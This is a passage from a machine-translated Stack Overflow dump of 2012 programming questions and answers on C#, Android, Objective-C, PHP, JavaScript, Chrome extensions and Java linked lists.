上面的示例仅与三个 UserControl 相关，并且可能有大约 200 多个 UserControls，每个 UserControls 可能包含更多的 Event/Method/Properties 和 Form1.cs 编码页面上的 Enum。我只想按我在上面通过注释手动声明的特定 UserControl Idenetity 对它们进行排序`//`。

所以我的想法是在**form1.cs**中声明一个特定的方法，该方法与特定的 UserControls 相关，这些 UserControls 分别包含它们的事件/方法/属性/枚举，因此我们可以轻松解决上述混淆。

可能吗？。还是有其他更好的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:17:12.773

您可以使用 #region - #endregion 标签，例如：

```
#region MyUserControl1 things

//Put your MyUserControl1 methods, event handlers etc. here

#endregion

#region MyUserContro2 things

//Put your MyUserContro2 methods, event handlers etc. here

#endregion 
```

# c# - 为什么我更喜欢枚举而不是具有常量值的结构

> ID：13429156
> 
> 赞同：34
> 
> 时间：2012-11-17T09:02:12.983
> 
> 标签：c#, struct, enums

带有常量的结构：

```
public struct UserType
{
  public const int Admin=1;
  public const int Browser=2;
  public const int Operator=3;
} 
```

现在让我们为同样的目的使用一个枚举：

```
public enum UserType
{
  Admin=1,
  Browser,
  Operator
} 
```

两者都分配在堆栈上。在这两种情况下，我都会说 UserType.Admin。使用 struct 方式，我不必强制转换为 int 来获取基础值。我知道使用 enum 版本可以保证使用三个值中的一个且只有一个，而使用 struct 版本可以是任何整数used，表示 Int32.MinValue 和 Int32.MaxValue 之间的任何值。除了这个之外，更喜欢枚举还有其他好处吗？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-11-17T09:05:31.607

> 除了这个之外，更喜欢枚举还有其他好处吗？

明晰。

假设您有一个始终具有这三个值之一的字段或方法参数。如果将其设为枚举类型，则：

*   您不能意外地为其分配一些任意整数值。（您可以*故意*将任何`int`值强制转换为枚举类型，但您必须明确地这样做。）
*   很清楚该值代表什么样的信息

这些对于编写将来易于维护的代码来说是*非常重要的好处。*你越能让你的代码自然地*描述*你想要达到的目标越好。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-17T09:08:26.567

枚举可以在没有反射的情况下从字符串或数字中查找，例如

```
// VERY important when using ORMs, as databases usually use an int
UserType ut = (UserType)2; 

// Useful when parsing config files like appSettings.
UserType utf = (UserType)Enum.Parse(typeof(UserType),"Admin"); 
```

框架中还有很多东西可以让 Enums 的常见操作更快。另一件事是位域的[FlagsAttribute](http://msdn.microsoft.com/en-us/library/System.FlagsAttribute.aspx)，这对于 const int 来说是不容易实现的。

[检查Enum 类](http://msdn.microsoft.com/en-us/library/system.enum.aspx)的成员以获得更多帮助函数，例如 GetNames 和 GetValues。

# android - 检测usb端口android dongle

> ID：13429157
> 
> 赞同：0
> 
> 时间：2012-11-17T09:02:58.940
> 
> 标签：android, usb

我正在开发一个 Android 项目。我需要一点帮助。有人可以指导我如何检查 Android 设备中的 USB 端口是否已启用。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:09:41.703

您需要通过以下操作使用 BroadCastReceiver，

```
<receiver android:name=".DetactUSB">
   <intent-filter>
        <action android:name="android.intent.action.UMS_CONNECTED" />
        <action android:name="android.intent.action.UMS_DISCONNECTED" />
   </intent-filter>
</receiver> 
```

在 BroadcastReceiver 中，您可以编写如下代码进行检查，

```
public class DetactUSB extends BroadcastReceiver
{ 
    private static final String TAG = "DetactUSB";
    @Override
    public void onReceive(Context context, Intent intent) 
    {
        // TODO Auto-generated method stub
        if (intent.getAction().equalsIgnoreCase( "android.intent.action.UMS_CONNECTED"))
        {
                TextView textView = new TextView(context);
                textView.setBackgroundColor(Color.MAGENTA);
                textView.setTextColor(Color.BLUE);
                textView.setPadding(10,10,10,10);
                textView.setText("USB connected……….");
                Toast toastView = new Toast(context);
                toastView.setDuration(Toast.LENGTH_LONG);
                toastView.setGravity(Gravity.CENTER, 0,0);
                toastView.setView(textView);
                toastView.show();
                Log.i(TAG,"USB connected..");
        }
        if (intent.getAction().equalsIgnoreCase( "android.intent.action.UMS_DISCONNECTED"))
        {
                TextView textView = new TextView(context);
                textView.setBackgroundColor(Color.MAGENTA);
                textView.setTextColor(Color.BLUE);
                textView.setPadding(10,10,10,10);
                textView.setText("USB Disconnected……….");
                Toast toastView = new Toast(context);
                toastView.setDuration(Toast.LENGTH_LONG);
                toastView.setGravity(Gravity.CENTER, 0,0);
                toastView.setView(textView);
                toastView.show();
        }
    } 
} 
```

# c# - 突出显示列表框中的多个项目/行

> ID：13429159
> 
> 赞同：0
> 
> 时间：2012-11-17T09:03:20.327
> 
> 标签：c#, .net, c#-4.0, listbox

我有一个列表框，显示每行中 (X,Y) 的一些位置。

不知何故，用户可以在文本框中输入几个 (X,Y) 对，然后按下按钮。

现在我想要做的是：每次用户输入 3 或 4 个（X，Y）对时，我的算法都会找到匹配的对，并且这些对应的对应该同时突出显示（比如说粉红色/红色/任何颜色）一起在列表框中。

如何用我想要的颜色突出显示这些对（相同的索引）？

* * *

第 1 版：

在[NikolaD - Nick](https://stackoverflow.com/users/1727342/nikolad-nick)的指导下，我将 DrawMode 更改为**OwnerDrawVariable**并在 lsBoxFeature_DrawItem 方法中添加了以下代码：

```
private void lsBoxFeature_DrawItem(object sender, DrawItemEventArgs e)
    {
        e.DrawFocusRectangle();
        Bitmap bmp = new Bitmap(e.Bounds.Width, e.Bounds.Height);
        Graphics g = Graphics.FromImage(bmp);

            foreach (var item in globalDataForAllMatchedFrames[globalDataForAllMatchedFrames.Count - 1].featureNumber)
            {
                if (lsBoxFeature.Items[e.Index].Equals(item))//your method that determines should current item be highlighted 
                {
                    g.Clear(Color.Red);
                }
                else
                {
                    g.Clear(lsBoxFeature.BackColor);
                }

                g.DrawString(lsBoxFeature.Items[e.Index].ToString(), lsBoxFeature.Font, new SolidBrush(lsBoxFeature.ForeColor), e.Bounds);
                e.Graphics.DrawImage(bmp, e.Bounds);
                g.Dispose();
            }

    } 
```

item 是一个 PointF 对象，现在每次 item 等于 listBoxFeature 中的那些成员时，它应该以红色突出显示它们。

有两个问题：

I）似乎methos .Equals在if条件下无法正常工作以检查pointF项目是否等于listBoxFeature中的成员===>因此我的listBoxFeature中没有显示任何内容

II）即使当我运行代码时，我也会收到如下错误消息：

![在此处输入图像描述](../Images/5e4e63929d3a8fa337c568b9ad0c63c2.png)

* * *

**第 2 版：**

我遵循[NikolaD - Nick](https://stackoverflow.com/users/1727342/nikolad-nick)的建议，它奏效了！！！。但是有一小部分需要解决，它没有显示 lsBoxFeature 中每一行的文本（PointF 坐标）。

这是它现在的样子：

![在此处输入图像描述](../Images/8bf1dc00b89bc47430aeb4c453d90700.png)

这是输出应该是这样的：

![在此处输入图像描述](../Images/936e8af37e7b162e7bdf0e6d08c9656d.png)

我怎样才能在 lsBoxFeature 中取回该行的 tex？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:20:38.340

您应该添加`ListView`的事件处理程序并在检查应该着色`DrawItem`时绘制突出显示。`Items`像这样的东西：

```
 private void listBox1_DrawItem(object sender, DrawItemEventArgs e)
        {
                e.DrawFocusRectangle();
                Bitmap bmp = new Bitmap(e.Bounds.Width, e.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);

                if (MeetsCriterion(listBox1.Items[e.Index]))//your method that determines should current item be highlighted 
                {
                    g.Clear(Color.Red);
                }
                else
                {
                    g.Clear(listBox1.BackColor);
                }
                g.DrawString(listBox1.Items[e.Index].ToString() , listBox1.Font, new SolidBrush(listBox1.ForeColor), e.Bounds);
                e.Graphics.DrawImage(bmp, e.Bounds);
                g.Dispose();
        } 
```

检查这个问题，有一个更详细的答案如何做到这一点：[如何在某些行中将相同的字符串添加到 ListBox？](https://stackoverflow.com/questions/12936647/how-do-i-add-same-string-to-a-listbox-in-some-lines/12936938#12936938)

**编辑：**此编辑是在您编辑了您的问题之后。对 listBox 中的每个项目调用 lsBoxFeature_DrawItem 事件处理程序，而不是对所有项目调用一次。第一个问题是为对象调用 Equals() 方法（ListBox 中的项是对象）有效地比较其他对象的引用，而不是 PointF 的值。第二个问题是您处理了 Graphic 对象，然后调用了 g.Clear()在处置的对象上。我已经重写了你的代码，我认为它现在可以工作了。

```
private void lsBoxFeature_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawFocusRectangle();
            Bitmap bmp = new Bitmap(e.Bounds.Width, e.Bounds.Height);
            Graphics g = Graphics.FromImage(bmp);

            bool found = false;
            int count = 0;
            PointF pF1 = (PointF)lsBoxFeature.Items[e.Index];
            while (!found && count < globalDataForAllMatchedFrames[globalDataForAllMatchedFrames.Count - 1].featureNumber.Count)
            {
                //next two lines are here to show you the problem with equals!!!!

                PointF pF2 = (PointF)globalDataForAllMatchedFrames[globalDataForAllMatchedFrames.Count - 1].featureNumber[count];
                if(pF1.Equals(pF2))
                {
                    found = true;
                }
                count++;
            }

            if (found)//your method that determines should current item be highlighted 
            {
                g.Clear(Color.Red);
            }
            else
            {
                g.Clear(lsBoxFeature.BackColor);
            }
            g.DrawString(lsBoxFeature.Items[e.Index].ToString(), lsBoxFeature.Font, new SolidBrush(lsBoxFeature.ForeColor),  new Rectangle(e.Bounds.X,0,e.Bounds.Width,e.Bounds.Height));
            e.Graphics.DrawImage(bmp, e.Bounds);
            g.Dispose();

        } 
```

# objective-c - 如何删除 来自 NSDictionary？

> ID：13429160
> 
> 赞同：0
> 
> 时间：2012-11-17T09:03:19.960
> 
> 标签：objective-c, nsdictionary, nsnull

我正在尝试使用`NSArray`不允许空值的 NSDictionaries 的 writeToFile 方法。我想只是循环并找到它们并用空替换，`NSString`但我无法让它工作。这就是我正在尝试的。

编辑： NSArrays 和 NSDictionaries 由 NSJSONSerialization 创建。

```
for (NSMutableDictionary *mainDict in mainArray)
{
    for(NSMutableDictionary *subDict in mainDict)
    {
        for(NSString *key in subDict)
        {                
            id value = [subDict objectForKey:key];

            if (value == [NSNull null])
            {
                [subDict setObject:@"" forKey:key];
            }
        }
    }
} 
```

但这会引发异常。`*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: '-[__NSCFDictionary setObject:forKey:]: mutating method sent to immutable object'`

但正如您所见，所有 NSDictionaries 都是可变的。

这是怎么回事？有一个更好的方法吗？

编辑：将新版本移至单独的答案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-17T09:05:43.807

你怎么知道字典是可变的？看起来他们不是。在枚举期间键入它们`NSMutableDictionary`不会使它们可变。您可以遍历字典并将键移动到一个新的、可变的中，过滤空值。

此外，如果您的字典来自`NSJSONSerialization`，请查看`NSJSONReadingOptions`，可以选择将可变容器用于反序列化结构。这并不总是一个好的解决方案，但值得一试。

至于在枚举字典时对其进行变异：您不能更改键，因为这很容易摆脱枚举代码。但我不明白为什么你不能改变键值，这就是你所追求的。此代码有效：

```
NSMutableDictionary *dict = [@{@"foo" : @"bar"} mutableCopy];
for (NSString *key in dict) {
    dict[key] = @"baz";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T21:56:15.793

或者重建整棵树的作品。

```
NSMutableArray *newMainArray = [[NSMutableArray alloc] init];
for (NSArray *subArray in self.mainArray)
{
    NSMutableArray *newSubArray = [[NSMutableArray alloc] init];
    for(NSDictionary *dict in subArray)
    {
        NSMutableDictionary *newDict = [[NSMutableDictionary alloc] init];
        for(NSString *key in dict)
        {              
            id value = [dict objectForKey:key];
            if (value == [NSNull null])
            {
                [newDict setObject:@"" forKey:key];
            } else {
                [newDict setObject:value forKey:key];
            }
        }
        [newSubArray addObject:newdict];
        [newDict release];
    }
    [newMainArray addObject:newSubArray];
    [newSubArray release];
}
[self.mainArray release];     <----  ????
self.mainArray = newMainArray; 
```

# android-layout - 在视图组中动态添加布局

> ID：13429163
> 
> 赞同：0
> 
> 时间：2012-11-17T09:03:49.017
> 
> 标签：android-layout

我想用不同的颜色动态添加四个相对布局。当我尝试添加它时，容器包含四个子视图。但只有三个布局可见。如何使第一个布局可见。

我的代码

```
int[] colors={Color.RED,Color.BLACK,Color.BLUE,Color.YELLOW};
        for(int i=0;i<4;i++){
            RelativeLayout relativeLayout=new RelativeLayout(MainActivity.this);
            relativeLayout.setId(i);
            RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(2400,100);                 
            if(i>0){
            layoutParams.addRule(RelativeLayout.BELOW,audioContainer.getChildAt(i-1).getId());
            }
            relativeLayout.setLayoutParams(layoutParams);   
            relativeLayout.setBackgroundColor(colors[i]);
            audioContainer.addView(relativeLayout);         

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T15:17:56.070

它不起作用，因为 ids 必须是正数。您可以简单地添加 1：

```
relativeLayout.setId(i + 1); 
```

当容器是垂直方向的 LinearLayout 时，做你想做的事情通常会容易得多。您可以简单地添加视图，而不必指定任何布局规则或 ID。

# sql-server - 更改数据捕获 - SQL SERVER？

> ID：13429166
> 
> 赞同：4
> 
> 时间：2012-11-17T09:04:05.923
> 
> 标签：sql-server, change-data-capture

我对 SQL SERVER 有疑问？

变更数据捕获 (CDC)

我应用了用户 DELETE、UPDATE、INSERT 操作没有的 CDC 流程。那么，如何获取用户名的信息呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:08:09.853

您可以使用触发器来记录操作和用户名。试试这个功能`SUSER_NAME()`或`SUSER_ID()`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-25T22:43:29.460

另一种方法是在您的跟踪表中有一个额外的列，用于存储提交当前更改的用户 ID。
当您查看表的历史记录时，它将使用适当的用户 ID 存储每一行​​。

# php - PHP卷曲？阿贾克斯？将 XML 数据馈送作为动态下拉菜单导入

> ID：13429168
> 
> 赞同：0
> 
> 时间：2012-11-17T09:04:49.440
> 
> 标签：php, curl, simplexml, datafeed

我有一家公司为搜索工具提供数据馈送，但我必须构建搜索工具。产品库存每小时变化一次，这就是为什么他们有产品信息的提要。我可以拉入提要以填充搜索表单，客户可以在其中搜索我的网站以查看该供应商是否提供产品。

有人能指出我正确的方向来解析 XML 提要并将结果显示为表单中的下拉列表吗？一旦他们选择了第一个项目，即“样式”，那么应该会出现一个名为“颜色”的新框，该框在第二次调用中再次从提要返回（我认为这将是第二次调用，传递第一次中收集的表单的参数选择。

我没有要求任何人为我写这个，但我是 cURL（我认为我需要使用）和 SimpleXML 的新手，只需要指向好的相关教程或一些建议的链接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T18:40:11.753

嗯，您希望事情如何发生并不是很清楚，因此很难就是否在服务器端或客户端消费 XML Feed 给出建议。

此外，您还没有解释如何“获取”xml 提要。它是需要身份验证的网络服务吗？它是什么类型的请求？或者它只是驻留在互联网某处的文件？还是在当地可以买到？

我将假设您使用的提要不需要复杂的请求或身份验证。

所以这是一个使用 jQuery 和 GET 请求的 AJAX 示例

XML 示例 (productsfeed.xml)

```
<products>
    <product id="prod1" name="iMac" price="2000" vendor="Apple">
        <stock>10</stock>
    </product>
    <product id="prod2" name="iPad" price="500" vendor="Apple">
        <stock>50</stock>
    </product>
    <product id="prod3" name="Galaxy S3" price="500" vendor="Samsung">
        <stock>100</stock>
    </product>
</products> 
```

* * *

带有 ajax 调用和产品下拉列表的示例 HTML。

```
<!DOCTYPE HTML>
<html>
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
        <script>
        $(document).ready(function(){
            $.ajax({
                url: 'http://myhost.com/webservice', // Url to the webservice or feed
                // Here goes all the "shenanigans" regarding the web service, like
                // request type, headers to send, etc..
                success: function(xml) {
                    $(xml).find('product').each(function(){
                        var id     = $(this).attr('id');
                        var name   = $(this).attr('name');
                        var price  = $(this).attr('price');
                        var vendor = $(this).attr('vendor');
                        var stock  = $(this).find('stock').text();

                        var $selectItem = $('<option></option>');
                        $selectItem.attr('value', id);
                        $selectItem.attr('data-id', id);
                        $selectItem.attr('data-price', price);
                        $selectItem.attr('data-vendor', vendor);
                        $selectItem.attr('data-stock', stock);
                        $selectItem.html(name);

                        $selectItem.appendTo('#plist');
                    });

                }
            });
        });
        </script>
    </head>
    <body>
        <div><span>Product List</span></div>
        <div id="plist-wrapper">
            <select id="plist">

            </select>
        </div>
    </body>
</html> 
```

* * *

现在使用 PHP

如果它是一个网络服务，你可以使用 cURL

```
$url = 'http://myhost.com/webservice';

// HTTP Headers to send to the webservice
// specific to the webservice you're consuming
$headers = array();

$ch = curl_init();

// curl_setopt to set the options
// see http://www.php.net/manual/en/function.curl-setopt.php
curl_setopt($ch, CURLOPT_URL, $url);

//headers if needed
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Send the request and check the response
if (($result = curl_exec($ch)) === FALSE) {
    echo 'Failed with' . curl_error($ch) . '<br />';
} else {
    echo "Success!<br />\n";
}
curl_close($ch); 
```

如果它不是网络服务（只是一个 xml 文件），您可以使用 file_get_contents

```
$result = file_get_contents('http://myhost.com/productsfeed.xml'); 
```

解析 xml 并显示下拉选择菜单

```
$xml = new DOMDocument();
$xml->loadXML($result);

$html = new DOMDocument();
$htmlSource = 
'<html>
    <head></head>
    <body>
        <div><span>Product List</span></div>
        <div id="plist-wrapper">
            <select id="plist"></select>
        </div>
    </body>
</html>';

$html->loadHTML($htmlSource);
$selectList = $html->getElementsByTagName('select')->item(0);
$optionItem = $html->createElement('option');

$prodNodeList = $xml->getElementsByTagName('product');

foreach ($prodNodeList as $prodNode) {
    $id     = $prodNode->getAttribute('id');
    $name   = $prodNode->getAttribute('name');
    $price  = $prodNode->getAttribute('price');
    $vendor = $prodNode->getAttribute('vendor');

    $option = clone $optionItem;
    $option->setAttribute('value', $id);
    $option->setAttribute('data-id', $id);
    $option->setAttribute('data-price', $price);
    $option->setAttribute('data-vendor', $vendor);
    $option->nodeValue = $name;
    $selectList->appendChild($option);
}

print $html->saveHTML(); 
```

# javascript - 模块模式和单例模式的区别？

> ID：13429169
> 
> 赞同：13
> 
> 时间：2012-11-17T09:04:56.723
> 
> 标签：javascript, design-patterns, singleton, module-pattern

我已经看到在某些项目中，`Module Pattern`使用而不是`Singleton Pattern`反之亦然。

`Module Pattern`我想确切地知道，和有什么不同`Singleton Pattern`？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-17T14:01:43.077

[*javascript中的模块模式*](http://en.wikipedia.org/wiki/Module_pattern)是指通用机制的代码模块化。将一个“类”拆分到多个文件中效果很好，因为您可以独立定义构造函数和各种原型方法组。每个模块通常都包装在一个闭包中以创建静态的局部变量——这被称为*揭示模块模式*。

[*javascript 中的单例模式*](http://en.wikipedia.org/wiki/Singleton_pattern)是指实例创建的限制，通常使用[延迟初始化](http://en.wikipedia.org/wiki/Singleton_pattern#Lazy_initialization)。

当然，您可以将模块模式视为单例模式的特化（参见[Wikipedia 文章](https://en.wikipedia.org/wiki/Module_pattern#Comparisons_to_other_concepts)），构造函数及其原型对象将成为“单例”的一部分。

然而，您也可以“独立地”组合它们：定义使用单例方法的类的模块。

# wpf - 在关闭应用程序 wpf vs2012 时保持按钮状态

> ID：13429170
> 
> 赞同：-1
> 
> 时间：2012-11-17T09:04:58.860
> 
> 标签：wpf, c#-4.0

我在Windows上有一些按钮，当我单击按钮时它会禁用，但是当我在关闭后重新启动程序时它会再次启用，有没有办法记住按钮的状态是启用还是禁用？我正在使用 VS2012 Ultimate

应用程序在 C# WPF .net4.5 中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:24:14.830

做这样的事情：

您将使用以下代码找到该按钮：

IWebElement 元素 = driver.FindElement(By.XPath(""));

获得按钮后，您可以使用检查按钮的状态

bool buttonEnabled = element.Enabled;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:31:40.213

您需要一种方法来保留您的设置。根据您的需要，使用数据库或配置/文本文件。

# android - 保护android中的超链接

> ID：13429171
> 
> 赞同：0
> 
> 时间：2012-11-17T09:05:02.473
> 
> 标签：android

我有一个 android 应用程序，其中我有一个在浏览器中打开的超链接。当任何人输入正确的密码时，超链接可见，否则它仍然不可见。问题是，如果任何人通过在浏览器中输入正确的密码来查看超链接那么他将永远不需要再次打开android应用程序来打开超链接，所以最后我希望用户每次想要查看超链接后面的页面时都必须打开android应用程序。这是我创建超链接的代码。

```
Password=(EditText)findViewById(R.id.pass);
        login=(Button)findViewById(R.id.login);
        txtDash=(TextView)findViewById(R.id.txtDash);
        String linkText = "Visit the <a href='http://sml.com.pk/a/cms/cmsdbandroid.php'>CMS Dashboard</a> web page.";
        txtDash.setText(Html.fromHtml(linkText));
        txtDash.setMovementMethod(LinkMovementMethod.getInstance());

        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View V) {
                try {
                if (Password.getText().toString().equals("dsml"))
                {

                    txtDash.setVisibility(View.VISIBLE);
                    login.setVisibility(View.INVISIBLE);
                    Password.setVisibility(View.INVISIBLE);

                }
                else
                {
                    Toast.makeText(getBaseContext(), "invalid password - try again",  Toast.LENGTH_SHORT).show();
                }
                }catch(Exception e){
                     //Log.e("log_tag", "Error"+e.toString());
                     Toast.makeText(getBaseContext(), e.toString(),  Toast.LENGTH_SHORT).show();
                }
            }
        }); 
```

请任何人帮助我做到这一点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:18:17.517

您可以在 Web 视图中启动 URL，而不是打开浏览器。用户在 Web 视图中看不到 URL。查看[此链接](http://developer.android.com/guide/webapps/webview.html)以获取 Web 视图详细信息。

# opengl - 透视投影矩阵：如何仅从水平 FoV 和纵横比计算垂直 FoV？

> ID：13429173
> 
> 赞同：2
> 
> 时间：2012-11-17T09:05:24.853
> 
> 标签：opengl, 3d, matrix, projection-matrix, perspectivecamera

考虑以下透视投影矩阵，它仅在调用者给出的垂直视野和纵横比下工作（非常好）：

```
func (me *Mat4) Perspective (fovY, aspect, near, far float64) {
    tfY = near * math.Tan(fovY * math.Pi / 360)
    tfX = tfY * aspect
    me.Frustum(-tfX, tfX, -tfY, tfY, near, far)
} 
```

如何扩展此函数的主体以支持这一点：调用者现在可以指定垂直（fovY）或水平（fovX）视野，但不能同时指定纵横比。这个函数如何能够仅根据给定的纵横比和 fovX 计算缺失的 fovY？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:31:11.617

这应该有效：

1.  使用水平 FOV 和到近平面的距离计算宽度（提示：有一个直角三角形的边`near`和`width/2`角`fovx/2`）。
2.  使用宽度和纵横比计算高度。
3.  使用高度和到近平面的距离计算垂直 FOV（提示：有一个直角三角形的边`near`和`height/2`角`fovy/2`）。

# php - 在 php / mysql 查询中分配 smarty 变量

> ID：13429176
> 
> 赞同：0
> 
> 时间：2012-11-17T09:05:48.090
> 
> 标签：php, smarty, phpfox

我在 phpfox 工作。我想在 mysql 查询中使用 smarty 变量。我进行了很多搜索并应用了stackoverflow中可用的所有方法/解决方案，但它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:19:09.860

使用[get_template_vars](http://www.smarty.net/docsv2/en/api.get.template.vars.tpl)获取 php 代码中的模板变量

```
$myVar = $smarty->get_template_vars('aPin');
echo $myVar.ITEMID; 
```

还可以尝试 get_template_vars() 来获取所有分配变量的列表

```
$myvar = $smarty->get_template_vars();
print_r($myvar); 
```

# google-chrome - 覆盖 Chrome 中的书签快捷键 (Ctrl+D) 功能

> ID：13429178
> 
> 赞同：13
> 
> 时间：2012-11-17T09:05:49.727
> 
> 标签：google-chrome, google-chrome-extension, keyboard-shortcuts, bookmarks

是否可以覆盖`Ctrl`+ `D`？我想，例如`console.log`，而不是添加到书签的链接。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-17T11:21:19.970

可以使用[`chrome.commands`](http://developer.chrome.com/extensions/commands.html)API 覆盖快捷方式。扩展程序可以在清单文件中建议一个默认快捷方式（例如 Ctrl+D），但用户可以在 处随意覆盖它`chrome://extensions/`，如下所示：

![键盘快捷键 - 扩展和应用程序](../Images/c3b92a9f3baa32516d69581c803a40ca.png)

## 用法

此 API 仍在开发中，*仅在[Beta](https://www.google.com/chrome/eula.html?extra=betachannel)和[Dev](https://www.google.com/chrome/eula.html?extra=devchannel)渠道可用，并且[Canary](https://tools.google.com/dlpage/chromesxs)构建* ^([更多信息](http://www.chromium.org/getting-involved/dev-channel))。从 Chrome 24 开始，每个人都可以使用它。

如果要在 Chrome 23 或更低版本中测试 API，请在清单文件中添加“实验”权限，并`chrome.experimental.commands`使用`chrome.commands`. 还可以访问`chrome://flags/`并启用“Experimental Extension APIs”，或使用该`--enable-experimental-extension-apis`标志启动 Chrome。

### `manifest.json`

```
{
    "name": "Remap shortcut",
    "version": "1",
    "manifest_version": 2,
    "background": {
        "scripts": ["background.js"]
    },
    "permissions": [
        "tabs"
    ],
    "commands": {
        "test-shortcut": {
            "suggested_key": {
                "default": "Ctrl+D",
                "mac": "Command+D",
                "linux": "Ctrl+D"
            },
            "description": "Whatever you want"
        }
    }
} 
```

### `background.js`

```
// Chrome 24+. Use chrome.experimental.commands in Chrome 23-
chrome.commands.onCommand.addListener(function(command) {
    if (command === 'test-shortcut') {
         // Do whatever you want, for instance console.log in the tab:
         chrome.tabs.query({active:true}, function(tabs) {
             var tabId = tabs[0].id;
             var code = 'console.log("Intercepted Ctrl+D!");';
             chrome.tabs.executeScript(tabId, {code: code});
         });
    }
}); 
```

## 文档

*   [`chrome.commands`](http://developer.chrome.com/extensions/commands.html)
*   [`chrome.tabs`](http://developer.chrome.com/extensions/tabs.html)（方法[`query`](http://developer.chrome.com/extensions/tabs.html#method-query)和[`executeScript`](http://developer.chrome.com/extensions/tabs.html#method-executeScript)）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-17T18:55:53.447

没有必要使用`chrome.commands`——您可以使用内容脚本来捕获`keydown`事件、调用`preventDefault`和`stopPropagation`处理它，并随心所欲地处理它。应该作为内容脚本的一部分工作的示例片段：

```
document.addEventListener('keydown', function(event) {
  if (event.ctrlKey && String.fromCharCode(event.keyCode) === 'D') {
    console.log("you pressed ctrl-D");
    event.preventDefault();
    event.stopPropagation();
  }
}, true); 
```

唯一不能以这种方式覆盖的是窗口处理命令，例如`ctrl-N`和`ctrl-<tab>`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-04-09T06:18:45.183

替代解决方案：在浏览器的地址栏中键入 chrome:extensions。这将打开 Chrome 扩展页面。

单击左上角菜单中的键盘快捷键（“菜单/汉堡按钮”）

将 Ctrl-D 分配给不会更改书签的插件。

这将解决当您不小心按Ctrl-D时直接创建书签的问题，而不是在这种情况下会弹出另一个插件。

# asp.net - 为什么 global.asax 上的代码在开发时运行良好但不能在 IIS 上运行

> ID：13429179
> 
> 赞同：1
> 
> 时间：2012-11-17T09:06:19.997
> 
> 标签：asp.net, iis-6

我有一些关于在 global.asax 上重写 url 的代码。当我建立我的网络时，它工作得很好。

```
protected void Application_BeginRequest(object sender, EventArgs e)
        {

            HttpContext httpContext = HttpContext.Current;
            string sDefaultPath = Context.Request.Path;

            switch (sDefaultPath.ToLower())
            {
                case "/trang-chu":
                    httpContext.RewritePath("/Default.aspx");
                    break;
                case "/gioi-thieu":
                    httpContext.RewritePath("/Contact/AboutUs.aspx");
                    break;

            }
        } 
```

但是当我将它部署在 IIS6、window server 2003 上时，它不起作用。

当我单击以下链接时：“http://scom:1122/gioi-thieu”它显示错误：“ **HTTP 错误 404 - 找不到文件或目录**”

请帮我修复它！谢谢！

# java - 如何在java中按字母顺序将节点添加到单链表？

> ID：13429183
> 
> 赞同：2
> 
> 时间：2012-11-17T09:07:13.227
> 
> 标签：java, singly-linked-list

这是我的中级 Java 课程的作业问题。我应该使用链接列表而不使用内置的添加方法来制作“字典”。我无法让它按字母顺序添加节点。我只是将每个节点附加或附加到列表中没有问题，但这不是问题所要求的。该程序应该能够按字母升序和降序（两个单独的 JOptionPane 菜单选项）显示单词列表（及其含义）。它的证明......困难。这是我的添加方法：

```
void add(WordMeaning wm)
{
    WordMeaningNode word = new WordMeaningNode(wm);
    WordMeaningNode current, prev;

    try
    {
        if(wmn == null)
        {
            wmn = word;
        }
        else
        {
            current = wmn;
            prev = null;
            while(current.next != null)
            {
                prev = current;
                current = current.next;
            }
            if(word.wm.getWord().compareToIgnoreCase(current.wm.getWord()) < 0)
            {
                word.next = current.next;
                current.next = word;
            }
            else if(word.wm.getWord().compareToIgnoreCase(current.wm.getWord()) > 0)
            {
                prev = current;
                current.next = word;
            }
        }
    }
    catch(NullPointerException e)
    {
        e.printStackTrace();
    }
} 
```

我确实知道 while 循环下的 if 语句有问题。我只是不知道是什么。我还不够好，还不知道出了什么问题（笑）。我想知道我是否应该先正常附加它们，然后按字母顺序对其进行排序。如果是这样，那我该怎么做？请温柔一点。;)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:17:05.013

我认为您可以先按升序添加所有单词，然后按所需的顺序（升序/降序）对其进行迭代。由于您已经有了具有上一个和下一个节点的双链表，因此迭代应该不是问题。尝试 ：

```
while(current.next != null)
        {
            prev = current;
            current = current.next;

            if(word.wm.getWord().compareToIgnoreCase(current.wm.getWord()) > 0)
            {
                word.next = current.next;
                current.next = word;
                break;  // break when correct position of word is found in ascending order.
            }
          /*  else if(word.wm.getWord().compareToIgnoreCase(current.wm.getWord()) > 0)
            {
                prev = current;
                current.next = word;
            }
          */  // No else condition is required
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:20:55.063

您的 while 循环跳到链表的末尾。最后，您尝试确定在哪里插入或附加节点（如果您提到。）

您要做的是跳到插入点（找到比要插入的节点更大的节点后面的节点。）

您需要类似（伪代码，因为这是一个作业）：

```
boolean found = false;
while (!found && current.next != null) {
    if (next word > word) {
        found = true;
    } else {
         prev = current;
         current = current.next;
    }
